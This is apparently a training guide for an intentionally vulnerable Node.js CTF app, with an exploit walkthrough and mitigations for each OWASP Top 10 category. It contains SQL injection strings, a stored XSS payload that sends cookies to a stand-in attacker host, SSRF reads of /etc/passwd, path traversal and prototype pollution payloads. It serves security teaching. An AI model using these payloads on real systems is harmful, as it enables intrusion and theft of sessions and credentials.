# Vulnerable CTF Application Guide

This guide documents how to set up, attack, and defend the intentionally vulnerable application included in this repository. It is designed for red-team style training aligned with the OWASP Top 10 and includes:

- ✅ A walkthrough for exploiting every built-in challenge and capturing the exposed flags.
- 🔐 Secure coding principles that are violated on purpose in the lab.
- 🛡️ Mitigation strategies you can apply to harden a production-grade build.

> **Legal Notice**
> The application is intentionally insecure and must only be used in isolated lab environments that you control. Do **not** deploy it to the public internet or target third-party systems.

---

## Environment Overview

- **Stack:** Node.js, Express, SQLite, EJS templates, and a tri-colour India-inspired UI theme.
- **Default credentials:**
  - Admin: `admin / admin123`
  - Standard user: `alice / password123`
- **Server port:** `5000` (configurable via the `PORT` environment variable).
- **Database:** SQLite file located at `vulnerable_ctf.db` that is bootstrapped automatically on startup.

---

## Interactive Learning Studio

The dashboard now includes a dedicated **Learning Studio** that supports instructors and self-paced learners:

- Review the intentionally vulnerable snippets for SQL injection, stored XSS, and broken access control straight from the browser.
- Read inline explanations that connect each snippet to the OWASP Top 10 and highlight the secure coding principle that is being violated.
- Draft a fix inside the patch textarea and press **Check patch** to receive instant feedback. The validator inspects the submission for the essential hardening techniques (parameterised queries, output encoding, identity enforcement).
- Expand the reference patch panel to compare your approach with one possible remediation once you are ready to debrief.

Use this area to demo secure countermeasures during workshops or to let defenders practice remediation after exploiting the challenge routes described below.

---

## Black Box Bounty Grounds (`/blackbox`)

The Black Box area mirrors the spirit of OWASP Juice Shop: it exposes multiple vulnerabilities without overt hints. Learners are expected to recon the UI, inspect network calls, and chain exploits to capture hidden flags.

### Available Targets

- **Mystery Inventory Search – `GET /blackbox/api/products?search=`**
  - *How to Exploit:* Supply payloads such as `' OR 1=1--` or UNION queries to dump the `inventory_note` column. A match containing suspicious SQL operators immediately reveals `CTF{Bl4ckB0x_Inv3nt0ry}` and leaks administrative secrets embedded in the product data.
  - *Why it Works:* The search term is concatenated directly into SQL, trusting user input and exposing stacked statements.
  - *Mitigations:* Adopt parameterised queries, whitelist allowed operators, and remove sensitive metadata from presentation models.

- **Note Vault Snooping – `GET /blackbox/api/notes/:id`**
  - *How to Exploit:* Enumerate IDs (`/blackbox/api/notes/1`, `/blackbox/api/notes/4`, etc.) to retrieve confidential and top-secret notes. Accessing protected classifications awards `CTF{Bl4ckB0x_ID0R}`.
  - *Why it Works:* There is no authorization or ownership check, so any authenticated user can fetch another team's notes.
  - *Mitigations:* Enforce per-note access control, randomize identifiers, and log unauthorized access attempts.

- **Feedback Echo Chamber – `POST /blackbox/api/feedback`**
  - *How to Exploit:* Submit HTML or `<script>` payloads in the message body. The server stores and echoes the payload unsanitised, allowing stored XSS and revealing `CTF{Bl4ckB0x_XSS}` the next time the stream renders.
  - *Why it Works:* Input is persisted verbatim and returned inside the UI without escaping.
  - *Mitigations:* Validate and encode feedback content, strip disallowed tags, and render stored messages using a safe templating engine.

- **Diagnostics Proxy Hop – `GET /blackbox/api/diagnostics?target=`**
  - *How to Exploit:* Point the proxy to `file:///etc/passwd` or `http://localhost:5000/debug` to read internal files and services. Fetching sensitive data yields `CTF{Bl4ckB0x_Pr0xy}`.
  - *Why it Works:* The diagnostic helper forwards arbitrary URLs (including `file://`) without allowlists or network egress controls.
  - *Mitigations:* Restrict outbound protocols/hosts, resolve file access locally with strict allowlists, and instrument SSRF detection.

Use `/blackbox` during workshops to encourage reconnaissance skills: have students enumerate endpoints, craft payloads, and then present mitigation strategies mirroring a real-world bug bounty report.

---

## Challenge Walkthroughs

Each challenge below contains the following sections:

- **Objective** – What the learner must accomplish.
- **How to Exploit** – Reproducible steps and payloads to obtain the flag.
- **Why it Works** – An explanation of the vulnerable code paths.
- **Mitigations** – Concrete fixes tied to secure coding principles.

### A01: Broken Access Control – `/admin`, `/profile/:userId`

**Objective:** Reach administrative screens and enumerate other user profiles to capture `CTF{Br0k3n_Acc3ss_C0ntr0l}` and `CTF{1D0R_Pr0bl3m}`.

**How to Exploit:**
1. Log in as `alice` and browse to `/admin` even though the UI hides the link.
2. Observe that the panel renders for any authenticated user and leaks the broken access flag.
3. Visit `/profile/1`, `/profile/2`, etc. to enumerate other accounts and trigger the IDOR flag when the ID does not match your session.

**Why it Works:**
- Routes only check that a session exists; they never verify `role` or ownership of the requested record.
- Sequential identifiers make guessing other account IDs trivial.

**Mitigations:**
- Enforce RBAC in middleware and verify resource ownership before querying the database.
- Replace sequential IDs with opaque references and log unauthorized access attempts.
- Apply **OWASP ASVS V4** controls for access control design and testing.

### A02: Cryptographic Failures – `/crypto-leak`

**Objective:** Decode the plaintext database backup leaked via the crypto route to recover `CTF{CrYpt0_F41lur3}` and sensitive secrets.

**How to Exploit:**
1. Request `GET /crypto-leak` to download the base64 encoded backup blob.
2. Decode with `echo '<backup>' | base64 -d` to reveal raw JSON passwords and card data alongside the flag.

**Why it Works:**
- Data at rest is merely base64 encoded instead of encrypted.
- No key management, rotation, or storage protection is in place for backups.

**Mitigations:**
- Encrypt backups using strong algorithms (AES-256-GCM) and protect keys in an HSM or vault.
- Rotate credentials after incidents and monitor for leaked artifacts.
- Follow **OWASP ASVS V10** guidance on cryptographic controls.

### A03: Injection – `/login`, `/comment`, `/search`

**Objective:** Abuse SQL injection to authenticate as admin and leverage stored XSS to exfiltrate cookies for `CTF{SQL1_1nj3ct10n_MAST3R}` and `CTF{XSS_C00k13_Th13f}`.

**How to Exploit:**
1. Submit `admin'--` as the username with any password on `/login` to short-circuit the WHERE clause and log in as admin.
2. Use the injected session to explore `/search?q=' OR '1'='1` and confirm arbitrary query execution.
3. Post `<script>fetch('https://attacker.test?c='+document.cookie)</script>` to `/comment` to store a payload; the JSON response reveals the XSS flag immediately.

**Why it Works:**
- SQL queries interpolate user input directly, allowing manipulation of the query structure.
- Comments are rendered with unescaped EJS tags and cookies are not marked `HttpOnly`, so payloads execute client-side.

**Mitigations:**
- Parameterize database access, encode output by default, and adopt security headers (CSP, X-Content-Type-Options).
- Restrict session cookie scope (`Secure`, `HttpOnly`, `SameSite=Strict`) and sanitize user-generated HTML.
- Implement centralized input validation routines tied to **OWASP ASVS V5** requirements.

### A04: Insecure Design – `/transfer`

**Objective:** Exploit the funds transfer workflow to siphon arbitrary balances and reveal `CTF{Insecure_Design_Blu3pr1nt}`.

**How to Exploit:**
1. Submit `POST /transfer` with `{ "toAccount": "alice", "amount": 20000 }` while authenticated as any user.
2. Observe that negative balances are permitted and the JSON response exposes the flag when large transfers are attempted.

**Why it Works:**
- No business rules enforce approvals, dual control, or balance validation.
- The server trusts the client-supplied `fromAccount` field and lacks rate limiting.

**Mitigations:**
- Capture design requirements early: define approval flows, enforce account ownership, and apply limits.
- Add idempotent transaction IDs and audit logging for all transfer attempts.
- Reference **OWASP ASVS V1** threat modeling practices to harden core business processes.

### A05: Security Misconfiguration – `/debug`, `/upload`

**Objective:** Harvest internal diagnostics and exploit path traversal to obtain `CTF{D3bug_3ndp01nt_3xp0s3d}` and `CTF{P4th_Tr4v3rs4l_F0und}`.

**How to Exploit:**
1. Browse to `/debug` to dump active sessions, file uploads, and the debug flag.
2. POST `{ "filename": "../public/pwned.txt", "content": "owned" }` to `/upload` to escape the intended directory; the response leaks the traversal flag.

**Why it Works:**
- Debug tooling is deployed in production with no authentication gates.
- File handling trusts user input paths and writes directly to disk without sandboxing.

**Mitigations:**
- Disable verbose diagnostics in production, require strong auth for operations tooling, and enforce least privilege on filesystem paths.
- Normalize upload paths with `path.resolve`, restrict allowed extensions, and store files outside the web root.
- Align remediation with **OWASP ASVS V9** configuration requirements.

### A06: Vulnerable & Outdated Components – `/legacy-merge`

**Objective:** Weaponize the legacy lodash `merge` helper to pollute prototypes and surface `CTF{0utd4t3d_C0mp0n3nt_Str1ke}`.

**How to Exploit:**
1. Submit `POST /legacy-merge` with `{ "payload": "{\"__proto__\":{\"flag\":\"CTF{0utd4t3d_C0mp0n3nt_Str1ke}\"}}" }`.
2. The response shows that the prototype flag is set globally due to the vulnerable lodash 4.17.4 version.

**Why it Works:**
- Unpatched lodash versions allow JSON input to modify `Object.prototype` via `__proto__`.
- The lab intentionally pins an outdated dependency without compensating controls.

**Mitigations:**
- Inventory dependencies, apply security patches quickly, and leverage tools like `npm audit` or SCA scanners.
- Freeze object prototypes (`Object.freeze(Object.prototype)`) and validate incoming JSON against schemas.
- Follow **OWASP ASVS V9** requirements for dependency management.

### A07: Identification & Authentication Failures – `/reset-password`, `/bypass-2fa`

**Objective:** Take over accounts through password reset abuse and bypass 2FA to capture `CTF{2FA_BYP4SS_M4ST3R}`.

**How to Exploit:**
1. Send `POST /reset-password` with `{ "email": "alice@example.com", "newPassword": "hacked" }` and log in using the new credentials.
2. Trigger the OTP endpoint: `POST /bypass-2fa` with `{ "username": "admin", "otp": "0000" }` (or set `rememberDevice=on`) to receive the bypass flag.

**Why it Works:**
- Credential recovery requires no verification token, so attackers reset passwords blindly.
- Two-factor codes accept a universal master value and the remember-me toggle bypasses validation altogether.

**Mitigations:**
- Issue signed, short-lived reset tokens and rate-limit attempts.
- Validate OTPs server-side with per-user secrets, expire them quickly, and monitor anomalies.
- Map fixes to **OWASP ASVS V7** and **V5** controls for authentication.

### A08: Software & Data Integrity Failures – `/import-config`

**Objective:** Import an unsigned build configuration to tamper with runtime behavior and unveil `CTF{UntrusTed_P1p3l1n3}`.

**How to Exploit:**
1. Prepare `{"flag":"CTF{UntrusTed_P1p3l1n3}"}` and base64 encode it (`echo -n '{"flag":"CTF{UntrusTed_P1p3l1n3}"}' | base64`).
2. POST the encoded blob to `/import-config`; the response confirms the flag without verifying a signature.

**Why it Works:**
- The pipeline accepts arbitrary base64 payloads and blindly trusts the contents.
- No integrity, authenticity, or provenance checks are performed before applying configs.

**Mitigations:**
- Sign configuration artifacts, validate signatures server-side, and restrict who can push pipeline updates.
- Store approved configs in version-controlled repositories with reviews.
- Reference **OWASP ASVS V14** supply-chain guidance.

### A09: Security Logging & Monitoring Failures – `/report-incident`, `/audit-log`

**Objective:** Demonstrate how critical alerts vanish by capturing `CTF{M0n1t0r1ng_Bl1nd_Sp0t}`.

**How to Exploit:**
1. Send `POST /report-incident` with `{ "event": "Admin brute-force detected", "severity": "critical" }`.
2. The API pretends to accept the report but immediately returns the monitoring flag without persisting anything.
3. Optional: call `/audit-log` to verify no events were stored and confirm visibility gaps.

**Why it Works:**
- Critical alerts are short-circuited for performance reasons and never reach analysts.
- Audit storage is optional and defaulted to in-memory arrays without durability.

**Mitigations:**
- Centralize logging, enforce retention, and integrate alerting pipelines with on-call rotations.
- Detect abuse with anomaly detection and tamper-proof log storage.
- Follow **OWASP ASVS V10** for logging and monitoring requirements.

### A10: Server-Side Request Forgery – `/fetch-url`

**Objective:** Force the backend to fetch internal resources to obtain `CTF{SSRF_L00pB4ck}` or `CTF{SSRF_Fi1e_R3tr13v4l}`.

**How to Exploit:**
1. POST `{ "target": "http://localhost:5000/debug" }` to `/fetch-url` and read internal debug data with the loopback flag.
2. Alternatively, request `{ "target": "file:///etc/passwd" }` to demonstrate local file reads and leak the file-based flag.

**Why it Works:**
- User-controlled URLs are fetched by the server with zero validation of scheme, host, or port.
- File URLs are allowed and read directly from disk without sandboxing.

**Mitigations:**
- Validate destinations against an allowlist, block internal/metadata IP ranges, and disable file protocol handling.
- Route outbound calls through egress proxies with strict policies and monitor for anomalies.
- Adopt **OWASP ASVS V10** SSRF controls and instrument response monitoring.

---

## Secure Coding Principles Recap

1. **Input Validation & Output Encoding:** Treat all client data as untrusted and validate/encode before use.
2. **Least Privilege & Defense in Depth:** Limit each account and component to the minimal permissions required.
3. **Secure Session Management:** Mark cookies as `HttpOnly`, `Secure`, `SameSite=strict`, and rotate on privilege changes.
4. **Error & Logging Hygiene:** Avoid leaking stack traces to clients; log security events centrally with correlation IDs.
5. **Configuration Hardening:** Disable debug features, enforce TLS, and keep dependencies patched.
6. **Secure SDLC Practices:** Incorporate threat modeling, code review, and automated testing (SAST/DAST) into the pipeline.

---

## Hardening Roadmap

To convert this lab into a production-ready service:

1. **Refactor Data Access:** Replace raw string queries with a repository layer that enforces parameterized statements.
2. **Implement RBAC Middleware:** Create reusable authorization guards for admin-only or owner-only routes.
3. **Adopt Secure Defaults:** Configure Helmet for HTTP headers, enforce HTTPS, and enable CSRF protection for forms.
4. **Add Automated Tests:** Write integration tests covering authentication, authorization, and sanitization logic.
5. **Pipeline Integration:** Add linting, unit tests, SAST/DAST scanners, and container image scanning before deployment.
6. **Operational Controls:** Instrument monitoring, centralized logging, and secrets management (Vault/KMS) for runtime safety.

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)
- [NIST SP 800-63B – Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

Happy hacking and stay safe! 🇮🇳
